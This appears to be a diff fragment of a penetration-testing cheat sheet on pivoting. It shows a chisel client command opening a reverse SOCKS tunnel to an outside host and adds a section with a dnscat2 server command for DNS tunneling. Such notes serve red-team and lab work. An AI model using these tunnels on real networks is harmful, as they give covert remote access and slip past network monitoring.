@@ -489,3 +489,11 @@ chisel client 13.37.13.37:3477 R:5000:socks
 ```
 socks5
 ```
+
+## DNS Tunneling with dnscat2
+
+
+
+```
+dnscat2-server feline.corp
+```
